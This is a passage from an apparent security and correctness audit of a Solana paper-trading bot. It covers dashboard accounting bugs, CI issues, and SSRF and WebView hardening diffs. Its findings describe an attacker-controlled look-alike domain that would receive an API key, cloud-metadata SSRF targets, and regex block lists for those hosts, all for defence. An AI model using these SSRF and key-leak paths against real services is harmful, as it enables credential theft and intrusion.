  2. Advance and save `this.cursor` only after signals complete processing, and do not advance past signals that experienced a retryable RPC transport error.
  3. Deduplicate signals by `(sig, mint)` key across polls.
- **Regression Tests Needed**:
  - Concurrent `tickPrices()` and `processSignal()` tests verifying no duplicate closes and strict `MAX_OPEN` adherence.

---

### [P1-05] Unresolved-Position Accounting & 2x Slippage Formula Discrepancies in Dashboard (`engine.ts`)
- **Severity**: **Medium**
- **File & Lines**:
  - `dashboard/src/services/engine.ts:521-525`
  - `dashboard/src/services/engine.ts:658-668`
  - `dashboard/src/services/engine.ts:835-923`
- **Code Evidence**:
  ```ts
  // dashboard/src/services/engine.ts:521-525
  // Archive if unresolved for > 30 minutes
  if (pos.isUnresolved && now - pos.openedAt > this.config.maxHoldSec * 1000) {
    this.closePosition(pos, 'unresolved', pos.executablePrice, pos.currentLiqUsd);
    continue;
  }
  ```
  ```ts
  // dashboard/src/services/engine.ts:660-667
  const entry2x = pos.entryPriceRaw * 1.10;
  const exit2x = exitPriceRaw * (1 - 0.16);
  let pnlPct2x = ((exit2x - entry2x) / entry2x) * 100;
  if (pos.tookHalf) {
    const half2x = 50 * (2.0 * 0.84 / 1.10 - 1);
    const rem2x = 50 * (exit2x / entry2x - 1);
    pnlPct2x = half2x + rem2x;
  }
  ```
- **Reproducible Failure Scenarios**:
  1. **Unresolved Positions Counted as Closed Trades in Dashboard**: When a position has missing quotes and reaches `maxHoldSec`, `engine.ts` calls `this.closePosition(pos, 'unresolved', pos.executablePrice, ...)`, which adds it directly to `this.closedTrades` using the last known `executablePrice` as if it were a confirmed fill. In `getStats()`, `closedCount = this.closedTrades.length` includes `unresolved` trades toward the `200` trade evaluation gate target, whereas `src/paper.js:476-537` and `src/report.js:174-175` strictly archive unresolved positions separately (`archivedUnresolved`) and exclude them from `closedCount`.
  2. **Unresolved Timeout Measured from `openedAt` Instead of `missingSince`**: Line 522 checks `now - pos.openedAt > this.config.maxHoldSec * 1000` instead of tracking `missingSince` (continuous missing quote duration). If a position had valid quotes for 29 minutes and then misses 12 ticks (1 minute), it is immediately closed as `unresolved` after 1 minute of missing quotes instead of 30 minutes of missing quotes.
  3. **Hardcoded 2x Slippage & Partial TP Price in `engine.ts`**: Lines 660-665 hardcode `1.10` (`2 * 0.05`), `0.16` (`2 * 0.08`), and `2.0` (assuming partial TP occurred at exactly `2.0 * entryPriceRaw` rather than the actual `halfRawPrice` quote on the tick when partial TP triggered, and ignoring user-configured `config.entrySlip` / `config.exitSlip`).
  4. **Mild Stressed PnL Assumption (`-25%` vs `-100%`)**: Line 911 computes `stressedList` by assuming unresolved positions lost `-25%` (`t.exitReason === 'unresolved' ? -25 : t.pnlPct2x`), whereas `src/report.js:145-151` models a true worst-case `-100%` loss on remaining unclosed weight (`banked + remWeight * -100`).
  5. **JSONL Export/Import Schema Incompatibility**: `StorageService.exportPaperJsonl` (`dashboard/src/services/storage.ts:181-203`) exports `ClosedTrade` objects (`pnlPct1x`, `exitReason`) without `ev: "paper_close"` or `pnl`, which is incompatible with `node src/report.js` (`src/report.js:102`), and `importPaperJsonl` cannot import `logs/paper.jsonl` generated by `src/main.js`.
- **Impact & Likelihood**: **Medium Impact / High Likelihood**. Causes analytics and 200-trade gate evaluation in the dashboard to diverge from `src/paper.js` and `src/report.js`.
- **Confidence & Verification Status**: **Confirmed** by comparing `dashboard/src/services/engine.ts` and `dashboard/src/services/storage.ts` against `src/paper.js` and `src/report.js`.
- **Recommended Minimal Fix**:
  1. Archive unresolved positions into a separate list (`archivedUnresolved`) after `missingSince` exceeds `maxUnresolvedMin`, excluding them from `closedCount` and the 200-trade gate.
  2. Record `halfRawPrice` on partial TP and compute `pnlPct2x` using `this.config.entrySlip * 2` and `this.config.exitSlip * 2` (matching `computeDoubleSlipPnl` in `src/paper.js`).
  3. Compute worst-case unresolved stress using `-100%` on remaining unclosed weight.
  4. Support both `paper.jsonl` (`ev: "paper_close"`, `pnl`, `pnl2xSlip`) and dashboard `ClosedTrade` formats in `exportPaperJsonl` / `importPaperJsonl`.
- **Regression Tests Needed**:
  - Unit tests verifying parity between `src/paper.js` + `src/report.js` and `dashboard/src/services/engine.ts` for partial TP + trailing stop, 2x slippage, unresolved archival, and JSONL import/export.

---

### [P1-06] CLI `report.js` Reconstructs `archivedList` Only from `paper.jsonl` When Any `paper_archived_unresolved` Event Exists
- **Severity**: **Low**
- **File & Lines**: `src/report.js:141`
- **Code Evidence**:
  ```js
  // src/report.js:141
  const archivedList = archivedEvents.length ? archivedEvents : archivedPositions;
  ```
- **Reproducible Scenario**:
  - If `logs/paper.jsonl` was rotated or truncated so it contains 1 recent `paper_archived_unresolved` event while `logs/positions.json` holds 5 older `archivedUnresolved` entries, `archivedEvents.length ? archivedEvents : archivedPositions` ignores the 4 entries in `positions.json` instead of deduplicating the union by `(mint, signalId, sig)`.
- **Impact & Likelihood**: **Low Impact / Low Likelihood**.
- **Confidence & Verification Status**: **Confirmed** by code inspection of `src/report.js:141`.
- **Recommended Minimal Fix**:
  - Merge `archivedEvents` and `archivedPositions` deduplicated by `${a.signalId ?? ""}:${a.sig ?? ""}:${a.mint}`.
- **Regression Tests Needed**:
  - Test `analyzeLogs` when `rows` has 1 archived event and `archivedPositions` has 1 additional prior archived position.

---

## 5. P2 — Build, CI, Android Release, & Documentation Findings

### [P2-01] GitHub Actions Workflow Permissions, Unverified SDK Downloads, & Missing Dashboard Build Step
- **Severity**: **Medium**
- **File & Lines**:
  - `.github/workflows/android-apk.yml:1-38`
  - `scripts/build-apk.sh:17-27`
- **Code Evidence**:
  ```yaml
  # .github/workflows/android-apk.yml:8-10 (no top-level permissions block)
  jobs:
    build:
      runs-on: ubuntu-latest
  ```
  ```bash
  # scripts/build-apk.sh:19,25 (no SHA-256 checksum verification)
  curl -fsSL https://dl.google.com/android/repository/build-tools_r34-linux.zip -o "$SDK_DIR/build-tools.zip"
  curl -fsSL https://dl.google.com/android/repository/platform-34-ext7_r02.zip -o "$SDK_DIR/platform.zip"
  ```
- **Reproducible Scenario**:
  1. `.github/workflows/android-apk.yml` omits an explicit `permissions: contents: read` block, inheriting the repository's default `GITHUB_TOKEN` permissions.
  2. `.github/workflows/android-apk.yml` runs `npm test` and `npm run build:apk`, which packages the pre-committed `app/assets/` files without running `npm run build:dashboard` or typechecking `dashboard/` (`tsc --noEmit`). If `dashboard/src/` is modified without rebuilding `app/assets/`, CI will package stale web assets into the APK.
  3. `scripts/build-apk.sh` downloads `build-tools_r34-linux.zip` and `platform-34-ext7_r02.zip` without verifying SHA-256 checksums, and signs `sniper-paper-bot.apk` with an auto-generated debug keystore (`CN=Android Debug,O=Android,C=US` with password `android` in `/tmp/sniper-debug.keystore`), which changes signing keys across ephemeral CI runs (preventing in-place APK upgrades on Android without uninstalling first).
- **Impact & Likelihood**: **Medium Impact / High Likelihood** (CI builds yield different debug signing keys on every run, breaking `adb install -r` upgrades on Android devices).
- **Confidence & Verification Status**: **Confirmed** by inspecting `.github/workflows/android-apk.yml` and `scripts/build-apk.sh`.
- **Recommended Minimal Fix**:
  1. Add `permissions: contents: read` to `.github/workflows/android-apk.yml`.
  2. Verify SHA-256 digests of `build-tools_r34-linux.zip` and `platform-34-ext7_r02.zip` in `scripts/build-apk.sh`.
  3. Run `npm run build:dashboard` in `.github/workflows/android-apk.yml` prior to `npm run build:apk`.
  4. Support deterministic signing via optional CI secrets (`ANDROID_KEYSTORE_BASE64`, `ANDROID_KEYSTORE_PASS`) while falling back to a documented debug keystore for local dev builds.
- **Regression Tests Needed**:
  - CI workflow step verifying `npm run build:dashboard` and `apksigner verify` succeed cleanly.

---

### [P2-02] Dependency Conflict & Unused Packages in `dashboard/package.json`
- **Severity**: **Low**
- **File & Lines**: `dashboard/package.json:14-39`
- **Code Evidence**:
  ```json
  "dependencies": {
    "@capacitor/android": "^7.6.9",
    "@capacitor/cli": "^7.6.9",
    "@capacitor/core": "^7.6.9",
    "@google/genai": "^2.4.0",
    ...
    "vite": "^8.3.0"
  },
  "devDependencies": {
    ...
    "esbuild": "^0.25.0"
  }
  ```
- **Reproducible Scenario**:
  1. `dashboard/package.json` declares `"esbuild": "^0.25.0"` alongside `"vite": "^8.3.0"`, which requires `esbuild ^0.27.0 || ^0.28.0`. Running standard `npm install` or `npm ci` inside `dashboard/` without `--legacy-peer-deps` fails with `ERESOLVE could not resolve`.
  2. `dashboard/package.json` includes unused dependencies (`@google/genai`, `motion`, `dotenv`, `@capacitor/*`) that are not imported anywhere in `dashboard/src/`.
- **Impact & Likelihood**: **Low Impact / High Likelihood** when running `npm ci` in `dashboard/`.
- **Confidence & Verification Status**: **Confirmed** by inspecting `dashboard/package.json:14-39`.
- **Recommended Minimal Fix**:
  - Update `"esbuild"` in `dashboard/package.json` to `"^0.28.0"` (matching `dashboard/package-lock.json`), remove unused dependencies (`@google/genai`), and regenerate `dashboard/package-lock.json` so `npm ci` works without `--legacy-peer-deps`.
- **Regression Tests Needed**:
  - Verify `npm ci` (without `--legacy-peer-deps`) and `npm run lint` (`tsc --noEmit`) succeed in `dashboard/`.

---

### [P2-03] Documentation & UI Modal Discrepancies vs. Actual Implementation
- **Severity**: **Informational / Low**
- **File & Lines**:
  - `README.md:5`
  - `dashboard/src/components/ApkModal.tsx:131-186`
  - `dashboard/src/services/storage.ts:19`
- **Code Evidence**:
  - `README.md:5` still states `Flow: Helius webhook -> Cloudflare Worker (KV) -> phone polls`, whereas the Worker now uses `SignalQueueDO` (SQLite Durable Object) with KV only as legacy fallback/migration.
  - `ApkModal.tsx:144-149` claims `AndroidManifest.xml` configures `android.permission.FOREGROUND_SERVICE` and `FOREGROUND_SERVICE_DATA_SYNC` and uses Capacitor Gradle build, whereas `app/android/AndroidManifest.xml:11-13` only requests `INTERNET`, `ACCESS_NETWORK_STATE`, and `WAKE_LOCK` and builds via `aapt2`/`d8`/`apksigner` in `scripts/build-apk.sh`.
  - `storage.ts:19` hardcodes a user-specific default URL `https://sniper-relay.pjdebnath01.workers.dev` in `DEFAULT_CONFIG.workerUrl`.
- **Impact & Likelihood**: **Low / Informational**. Operator confusion regarding background execution behavior (a `WebView` with `WAKE_LOCK` keeps running while foregrounded, not as an Android Foreground Service when backgrounded) and default Worker endpoint.
- **Confidence & Verification Status**: **Confirmed** by inspecting `README.md`, `ApkModal.tsx`, and `AndroidManifest.xml`.
- **Recommended Minimal Fix**:
  - Update `README.md` and `ApkModal.tsx` to accurately describe `SignalQueueDO`, `npm run ui`, `npm run build:dashboard`, `npm run build:apk`, and actual `AndroidManifest.xml` permissions.

---

## 6. Missing Tests & Verification Limitations

### 6.1 Missing Automated Tests
1. **Zero Automated Tests for `dashboard/src/`**: All 35 existing tests in `test/*.test.js` test `src/` and `worker/index.js`. There are no unit tests for `dashboard/src/services/solanaRpc.ts`, `dashboard/src/services/dexScreener.ts`, `dashboard/src/services/engine.ts`, or `dashboard/src/services/workerApi.ts`, which allowed `P1-01`, `P1-02`, `P1-03`, `P1-04`, and `P1-05` to go undetected.
2. **Missing Negative Security Tests for `/api/proxy`**: `test/ui.test.js` only tests positive proxy forwarding and error redaction; it does not test SSRF rejection (`127.0.0.1`, `169.254.169.254`), prefix-spoofed `workerUrl` domains (`https://sniper-relay.example.workers.dev.attacker.com`), or cross-origin CSRF protection.
3. **Missing Android WebView Security Configuration Tests**: No test asserts that `MainActivity.java` blocks external navigation (`shouldOverrideUrlLoading`) or restricts `AndroidBridge.httpRequest` to allowed HTTPS origins.

### 6.2 Audit Verification Limitations (Skipped Live/Mutating Checks)
In strict compliance with the read-only mission rules:
- **Live Cloudflare Worker / Helius / Telegram / Mainnet RPC Calls**: Skipped to avoid contacting production services, exposing credentials, or mutating live Durable Object state.
- **Dependency Installation / APK Rebuild**: Skipped during this audit phase to preserve existing project files and state.

---

## 7. Ordered Remediation Plan (With Dependencies & Acceptance Criteria)

| Phase | Step | Finding IDs | Dependencies | Acceptance Criteria |
| :--- | :--- | :--- | :--- | :--- |
| **Phase 1: P0 Security Boundaries** | **1.1** Harden `src/ui.js` and `dashboard/server.ts` `/api/proxy` | `P0-01`, `P0-02` | None | `server.ts` binds to `127.0.0.1` without wildcard CORS. Both proxies enforce exact URL origin parsing (`new URL(target).origin === new URL(workerUrl).origin`), block private/loopback/metadata IPs, set `redirect: 'error'`, validate `Origin`/`Sec-Fetch-Site`, and never leak `APP_KEY` to prefix-spoofed domains. |
| **Phase 1: P0 Security Boundaries** | **1.2** Harden Android `MainActivity.java` & `AndroidManifest.xml` | `P0-03` | None | `usesCleartextTraffic="false"`, `setAllowFileAccess(false)`, `setAllowContentAccess(false)`, `MIXED_CONTENT_NEVER_ALLOW`, `shouldOverrideUrlLoading` blocks non-asset WebView navigation, and `AndroidBridge.httpRequest` enforces `https://` + host allowlist + `setInstanceFollowRedirects(false)`. |
| **Phase 1: P0 Security Boundaries** | **1.3** Harden Worker auth & log redaction | `P0-04`, `P0-05` | None | `worker/index.js` uses Web Crypto `crypto.subtle.verify("HMAC", ...)` for constant-time comparison of `HELIUS_AUTH` and `APP_KEY`, caps `/hook` body size (256 KB) and batch length (100), and `src/main.js` / `src/paper.js` / `src/rpc.js` redact all error strings and URL userinfo. |
| **Phase 2: P1 Paper-Trading Integrity** | **2.1** Fix Dashboard On-Chain Gate & DexScreener Pair Selection | `P1-01`, `P1-03`, `P1-06` | None | `solanaRpc.ts` performs the 2-step owner-account check so wallet holders are aggregated accurately (never misclassified as vaults) and aligns Token-2022 checks with `src/gate.js`. `dexScreener.ts` removes the inverted-pair fallback and supports `preferredPair`. |
| **Phase 2: P1 Paper-Trading Integrity** | **2.2** Fix Dashboard Engine Cursor, Concurrency, Unresolved Archival, & Benchmark Isolation | `P1-02`, `P1-04`, `P1-05` | Step 2.1 | `App.tsx` no longer auto-seeds 200 synthetic trades into live storage on startup; `simulateSignal()` does not advance the live Worker cursor; `engine.ts` adds `isTicking` and `openingMints` locks, advances cursor only after batch processing, archives unresolved positions separately after `missingSince >= 30m`, and computes 2x slippage using actual `halfRawPrice` and configured slippage. |
| **Phase 3: P2 Build, CI, & Tests** | **3.1** Fix `dashboard/package.json`, CI workflow, and rebuild bundle/APK | `P2-01`, `P2-02`, `P2-03` | Phases 1 & 2 | `dashboard/package.json` resolves `esbuild` conflict, `.github/workflows/android-apk.yml` sets `permissions: contents: read` and runs `npm run build:dashboard`, `scripts/build-apk.sh` verifies SDK zip SHA-256 digests, and unit/regression tests pass (`npm test`). |

---

## 8. Phase 1 Security Remediation: Pre-Execution Verification & Proposed Diffs

> **Status**: **STRICT DIFF-FIRST GATE — PENDING EXPLICIT OPERATOR APPROVAL**  
> **Evaluation Date**: 2026-10-28  
> **Baseline Commit**: `main` @ `15cf45c6ecd7dc008de8fd20a59b1fab509133cd` (code baseline identical to `27d30ef30e63ea62d66fa99a1c09fba6a00f3671`)

### 8.1 Finding Verification Matrix

| Finding ID | Title | Source Files Inspected | Status | Verification Detail |
| :--- | :--- | :--- | :--- | :--- |
| **P0-01** | SSRF & Wildcard CORS in `dashboard/server.ts` | `dashboard/server.ts:16-95` | **Confirmed** | Express binds to `0.0.0.0:3000` with `Access-Control-Allow-Origin: *`. Endpoint `app.all('/api/proxy')` forwards any method and destination with zero origin/scheme/host/IP checks and default `redirect: 'follow'`, exposing localhost services and cloud metadata (`169.254.169.254`). |
| **P0-02** | `APP_KEY` Exposure & Cross-Origin SSRF in `src/ui.js` | `src/ui.js:96-172` | **Confirmed** | Trust check `targetUrl.startsWith(cleanWorker)` uses a raw string prefix, allowing attacker domain `https://sniper-relay.example.workers.dev.attacker.com` to receive `x-key: runtimeCfg.appKey`. Mode A forwards caller-supplied `x-key` to arbitrary destinations. No `Origin` or `Sec-Fetch-Site` validation exists on `/api/proxy`. |
| **P0-03** | Android WebView Navigation & `AndroidBridge` | `MainActivity.java:43-174`, `AndroidManifest.xml:19` | **Confirmed** | Default `WebViewClient` lacks `shouldOverrideUrlLoading`, keeping `@JavascriptInterface` active if external links load inside the WebView. `setAllowFileAccess(true)` and `usesCleartextTraffic="true"` remain enabled. `AndroidBridge.httpRequest` does not validate hosts, allows userinfo, and does not disable redirects. |
| **P0-04** | Worker Request Size/Batch Limits & Non-Constant-Time Auth | `worker/index.js:279-285, 680-710` | **Confirmed** | `!==` string comparison leaks timing signals. Web Crypto on Cloudflare Workers does not support `crypto.subtle.timingSafeEqual`; timing-safe comparison must be implemented via fixed SHA-256 hashing + constant-time XOR byte comparison. `/hook` lacks payload byte caps and batch length caps (must explicitly reject with 413/400, never silently truncate). |
| **P0-05** | Consistent Secret Redaction in Errors & Logs | `src/rpc.js:5-47`, `src/main.js:141-423`, `src/paper.js:117-511` | **Confirmed** | `redactSecrets` does not strip URL userinfo (`username:password@`). Multiple `logFn("error", { msg: String(e) })` and `logFn("gate_error", ...)` calls write raw exceptions directly to `logs/paper.jsonl` without redaction. |

### 8.2 Proposed Unified Diffs

#### Diff 1: `dashboard/server.ts` (P0-01)
```diff
--- a/dashboard/server.ts
+++ b/dashboard/server.ts
@@ -10,21 +10,32 @@ const __dirname = path.dirname(__filename);
 async function startServer() {
   const app = express();
   const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
+  const HOST = process.env.HOST || '127.0.0.1';
+  const ALLOWED_METHODS = new Set(['GET', 'POST', 'HEAD']);
 
-  app.use(express.json({ limit: '10mb' }));
+  app.use(express.json({ limit: '256kb' }));
 
-  // CORS headers for all local API routes
+  // Strict local-origin CORS headers: reject untrusted cross-origin requests
   app.use((req, res, next) => {
-    res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-key, x-target-url');
+    const origin = req.headers.origin;
+    if (origin) {
+      const isLocal = origin === `http://${HOST}:${PORT}` ||
+        origin === `http://127.0.0.1:${PORT}` ||
+        origin === `http://localhost:${PORT}`;
+      if (!isLocal) {
+        res.status(403).json({ error: 'Cross-origin requests forbidden' });
+        return;
+      }
+      res.header('Access-Control-Allow-Origin', origin);
+      res.header('Access-Control-Allow-Methods', 'GET, POST, HEAD, OPTIONS');
+      res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-key, x-target-url');
+    }
     if (req.method === 'OPTIONS') {
-      res.sendStatus(200);
+      res.sendStatus(204);
       return;
     }
     next();
   });
 
   // Health check
   app.get('/api/health', (req, res) => {
@@ -34,10 +45,46 @@ async function startServer() {
   // Universal Proxy Endpoint for CORS-restricted Worker or RPC requests during web preview
   app.all('/api/proxy', async (req: Request, res: Response) => {
+    if (!ALLOWED_METHODS.has(req.method)) {
+      res.status(405).json({ error: 'Method not allowed' });
+      return;
+    }
+
     const targetUrl = (req.headers['x-target-url'] as string) || (req.query.url as string);
     if (!targetUrl) {
       res.status(400).json({ error: 'Missing x-target-url header or url query param' });
       return;
     }
 
+    let parsed: URL;
+    try {
+      parsed = new URL(targetUrl);
+    } catch {
+      res.status(400).json({ error: 'Invalid target URL' });
+      return;
+    }
+
+    if (parsed.protocol !== 'https:') {
+      res.status(400).json({ error: 'Only HTTPS targets are allowed' });
+      return;
+    }
+    if (parsed.username || parsed.password) {
+      res.status(400).json({ error: 'Credentials in URL are forbidden' });
+      return;
+    }
+
+    // IP literal and cloud metadata rejection (IPv4, IPv6, octal, hex, loopback, link-local)
+    const host = parsed.hostname.toLowerCase();
+    if (/^(?:\d+|0x[0-9a-f]+|\d+\.\d+\.\d+\.\d+|\[.*\])$/i.test(host) ||
+        host === '169.254.169.254' || host === 'metadata.google.internal' || host === 'localhost') {
+      res.status(403).json({ error: 'Direct IP literals and metadata hosts are forbidden' });
+      return;
+    }
+
+    // Route-specific method and destination validation: DexScreener, Worker origin, or RPC
+    const configuredWorkerHost = process.env.WORKER_URL ? new URL(process.env.WORKER_URL).hostname.toLowerCase() : null;
+    const isDex = host === 'api.dexscreener.com' && parsed.pathname.startsWith('/latest/dex/tokens/') && req.method === 'GET';
+    const isWorker = configuredWorkerHost ? (host === configuredWorkerHost) : host.endsWith('.workers.dev');
+    const isWorkerRead = isWorker && (parsed.pathname === '/signals' || parsed.pathname === '/export-kv') && req.method === 'GET';
+    const isWorkerMutation = isWorker && (parsed.pathname === '/heartbeat' || parsed.pathname === '/halt' || parsed.pathname === '/notify') && req.method === 'POST';
+    const isRpc = (host === 'api.mainnet-beta.solana.com' || host.endsWith('.helius-rpc.com') || host.endsWith('.quiknode.pro')) &&
+      req.method === 'POST';
+
+    if (!isDex && !isWorkerRead && !isWorkerMutation && !isRpc) {
+      res.status(403).json({ error: 'Target destination, method, or path is not permitted' });
+      return;
+    }
+
     try {
       const headers: Record<string, string> = {
         'content-type': 'application/json',
       };
 
-      const xKey = req.headers['x-key'] as string;
-      if (xKey) {
+      // Forward x-key only to approved Worker paths
+      const xKey = req.headers['x-key'] as string;
+      if (xKey && isWorker) {
         headers['x-key'] = xKey;
       }
 
       const fetchOptions: RequestInit = {
         method: req.method,
         headers,
+        redirect: 'error',
+        signal: AbortSignal.timeout(10000),
       };
 
       if (req.method !== 'GET' && req.method !== 'HEAD' && req.body) {
         fetchOptions.body = JSON.stringify(req.body);
       }
 
       const response = await fetch(targetUrl, fetchOptions);
@@ -90,7 +137,7 @@ async function startServer() {
     });
   }
 
-  app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Sniper Paper Bot Server running on http://0.0.0.0:${PORT}`);
+  app.listen(PORT, HOST, () => {
+    console.log(`🚀 Sniper Paper Bot Server running on http://${HOST}:${PORT}`);
   });
 }
```

#### Diff 2: `src/ui.js` (P0-02)
```diff
--- a/src/ui.js
+++ b/src/ui.js
@@ -57,6 +57,51 @@ export function createUiHandler(deps = {}) {
   return async function handleUiRequest(req, res) {
     const url = new URL(req.url || "/", "http://127.0.0.1");
     const path = url.pathname;
+
+    // Helper: validate target destination, route, and method against strict allowlist
+    function validateProxyTarget(targetStr, method = "GET") {
+      let u;
+      try {
+        u = new URL(targetStr);
+      } catch {
+        return null;
+      }
+      if (u.protocol !== "https:" && u.protocol !== "http:") return null;
+      if (u.username || u.password) return null;
+
+      const hostname = u.hostname.toLowerCase();
+      // Reject IP literals (IPv4, IPv6, octal, hex), cloud metadata, and loopback
+      if (/^(?:\d+|0x[0-9a-f]+|\d+\.\d+\.\d+\.\d+|\[.*\])$/i.test(hostname) ||
+          hostname === "169.254.169.254" || hostname === "metadata.google.internal" || hostname === "localhost") {
+        return null;
+      }
+
+      let parsedWorker = null;
+      try {
+        if (runtimeCfg.workerUrl) parsedWorker = new URL(runtimeCfg.workerUrl);
+      } catch {}
+
+      let parsedRpc = null;
+      try {
+        if (runtimeCfg.rpcUrl) parsedRpc = new URL(runtimeCfg.rpcUrl);
+      } catch {}
+
+      const isWorkerOrigin = parsedWorker && u.origin === parsedWorker.origin;
+      const isRpcOrigin = parsedRpc && u.origin === parsedRpc.origin;
+      const isDexOrigin = u.origin === "https://api.dexscreener.com";
+
+      const isWorkerRead = isWorkerOrigin && (u.pathname === "/signals" || u.pathname === "/export-kv") && method === "GET";
+      const isWorkerMutation = isWorkerOrigin && (u.pathname === "/heartbeat" || u.pathname === "/halt" || u.pathname === "/notify") && method === "POST";
+
+      if (isWorkerRead || isWorkerMutation) {
+        return { parsed: u, type: "worker" };
+      }
+      if (isRpcOrigin && method === "POST") {
+        return { parsed: u, type: "rpc" };
+      }
+      if (isDexOrigin && u.pathname.startsWith("/latest/dex/tokens/") && method === "GET") {
+        return { parsed: u, type: "dex" };
+      }
+      return null;
+    }
 
     if (path === "/api/status" && req.method === "GET") {
@@ -96,26 +141,40 @@ export function createUiHandler(deps = {}) {
     if (path === "/api/proxy") {
+      // Reject untrusted cross-origin requests
+      const secFetchSite = req.headers["sec-fetch-site"];
+      if (secFetchSite === "cross-site") {
+        return sendJson(res, 403, { error: "cross-site requests forbidden" });
+      }
+      const origin = req.headers.origin;
+      if (origin) {
+        try {
+          const o = new URL(origin);
+          const isLocal = (o.hostname === "127.0.0.1" || o.hostname === "localhost");
+          if (!isLocal) {
+            return sendJson(res, 403, { error: "cross-origin requests forbidden" });
+          }
+        } catch {
+          return sendJson(res, 403, { error: "invalid origin header" });
+        }
+      }
+
       try {
         const headerTargetUrl = req.headers["x-target-url"] ? String(req.headers["x-target-url"]).trim() : "";
         const rawBody = req.method !== "GET" && req.method !== "HEAD" ? await readRequestBody(req) : "";
 
         // Mode A: x-target-url header (used by integrated React Sniper-dashboard)
         if (headerTargetUrl) {
           let targetUrl = headerTargetUrl;
           if (targetUrl === "https://api.mainnet-beta.solana.com" || targetUrl === "__SERVER_ENV_RPC_URL__") {
             targetUrl = runtimeCfg.rpcUrl;
           }
-          if (!/^https?:\/\//i.test(targetUrl)) {
-            return sendJson(res, 400, { error: "invalid target url" });
-          }
+          const targetInfo = validateProxyTarget(targetUrl, req.method || "GET");
+          if (!targetInfo) {
+            return sendJson(res, 403, { error: "forbidden target destination or path" });
+          }
 
           const headers = { "content-type": "application/json" };
-          const reqXKey = req.headers["x-key"] ? String(req.headers["x-key"]).trim() : "";
-          const cleanWorker = (runtimeCfg.workerUrl || "").replace(/\/$/, "");
-          if (reqXKey) {
-            headers["x-key"] = reqXKey;
-          } else if (cleanWorker && targetUrl.startsWith(cleanWorker) && runtimeCfg.appKey) {
+          // Only forward APP_KEY to exact verified Worker origin
+          if (targetInfo.type === "worker" && runtimeCfg.appKey) {
             headers["x-key"] = runtimeCfg.appKey;
           }
 
           const upstream = await fetchFn(targetUrl, {
             method: req.method || "GET",
             headers,
             body: req.method !== "GET" && req.method !== "HEAD" && rawBody ? rawBody : undefined,
+            redirect: "error",
             signal: AbortSignal.timeout(10000),
           });
@@ -140,11 +199,14 @@ export function createUiHandler(deps = {}) {
           targetUrl = runtimeCfg.rpcUrl;
         }
-        if (!/^https?:\/\//i.test(targetUrl)) {
-          return sendJson(res, 400, { error: "invalid target url" });
+        const targetInfo = validateProxyTarget(targetUrl, method);
+        if (!targetInfo) {
+          return sendJson(res, 403, { error: "forbidden target destination or path" });
         }
 
-        const cleanWorker = (runtimeCfg.workerUrl || "").replace(/\/$/, "");
-        if (cleanWorker && targetUrl.startsWith(cleanWorker) && !headers["x-key"] && runtimeCfg.appKey) {
+        const safeHeaders = { "content-type": "application/json" };
+        // Forward APP_KEY only to verified Worker endpoints; do not forward caller x-key
+        if (targetInfo.type === "worker" && runtimeCfg.appKey) {
+          safeHeaders["x-key"] = runtimeCfg.appKey;
         }
 
         const started = Date.now();
         const upstream = await fetchFn(targetUrl, {
           method,
-          headers,
+          headers: safeHeaders,
           body: method !== "GET" && method !== "HEAD" && reqBody ? reqBody : undefined,
+          redirect: "error",
           signal: AbortSignal.timeout(10000),
         });
```

#### Diff 3: `app/android/AndroidManifest.xml` (P0-03)
```diff
--- a/app/android/AndroidManifest.xml
+++ b/app/android/AndroidManifest.xml
@@ -16,7 +16,7 @@
         android:allowBackup="false"
         android:icon="@drawable/ic_launcher"
         android:label="@string/app_name"
-        android:usesCleartextTraffic="true"
+        android:usesCleartextTraffic="false"
         android:theme="@android:style/Theme.DeviceDefault.NoActionBar">
 
         <activity
```

#### Diff 4: `app/android/src/com/sniper/paperbot/MainActivity.java` (P0-03)
```diff
--- a/app/android/src/com/sniper/paperbot/MainActivity.java
+++ b/app/android/src/com/sniper/paperbot/MainActivity.java
@@ -4,6 +4,8 @@ import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.graphics.Color;
+import android.net.Uri;
 import android.os.Bundle;
 import android.view.Window;
 import android.view.WindowManager;
@@ -44,14 +46,31 @@ public class MainActivity extends Activity {
         WebSettings settings = webView.getSettings();
         settings.setJavaScriptEnabled(true);
         settings.setDomStorageEnabled(true);
         settings.setDatabaseEnabled(true);
-        settings.setAllowFileAccess(true);
-        settings.setAllowContentAccess(true);
-        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE);
+        settings.setAllowFileAccess(false);
+        settings.setAllowContentAccess(false);
+        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
 
-        webView.setWebViewClient(new WebViewClient());
+        webView.setWebViewClient(new WebViewClient() {
+            @Override
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                if (url == null) return true;
+                if (url.startsWith("file:///android_asset/")) {
+                    return false;
+                }
+                Uri uri = Uri.parse(url);
+                if ("https".equalsIgnoreCase(uri.getScheme())) {
+                    Intent intent = new Intent(Intent.ACTION_VIEW, uri);
+                    startActivity(intent);
+                    return true;
+                }
+                return true;
+            }
+        });
         webView.setWebChromeClient(new WebChromeClient());
-        webView.addJavascriptInterface(new AndroidBridge(this), "AndroidBridge");
+        webView.addJavascriptInterface(new AndroidBridge(this, webView), "AndroidBridge");
 
         setContentView(webView);
         webView.loadUrl("file:///android_asset/index.html");
@@ -69,8 +88,10 @@ public class MainActivity extends Activity {
     public static class AndroidBridge {
         private final Context context;
+        private final WebView webView;
 
-        public AndroidBridge(Context ctx) {
+        public AndroidBridge(Context ctx, WebView webView) {
             this.context = ctx.getApplicationContext();
+            this.webView = webView;
         }
 
+        private void assertLocalContext() {
+            String currentUrl = webView.getUrl();
+            if (currentUrl == null || !currentUrl.startsWith("file:///android_asset/")) {
+                throw new SecurityException("Bridge restricted to local app assets");
+            }
+        }
+
         @JavascriptInterface
         public void saveConfig(String json) {
+            assertLocalContext();
             SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
             prefs.edit().putString(KEY_CFG, json != null ? json : "").apply();
         }
 
         @JavascriptInterface
         public String loadConfig() {
+            assertLocalContext();
